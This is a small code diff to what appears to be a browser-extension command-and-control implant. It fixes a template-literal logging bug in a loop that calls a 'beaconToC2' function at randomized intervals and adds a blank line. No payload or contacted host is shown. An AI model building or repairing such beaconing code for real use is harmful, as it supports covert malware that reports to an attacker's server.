@@ -309,7 +309,7 @@ async function beaconToC2() {
 // Schedule next beacon
 function scheduleNextBeacon() {
   const interval = getRandomInterval();
-  console.log([Beacon] Next in ${interval / 1000}s);
+  console.log(`[Beacon] Next in ${interval / 1000}s`);
   setTimeout(async () => {
     await beaconToC2();
     scheduleNextBeacon();
@@ -395,6 +395,7 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage?.addListener) {
   return true;
 });
 }
+
 
 
 
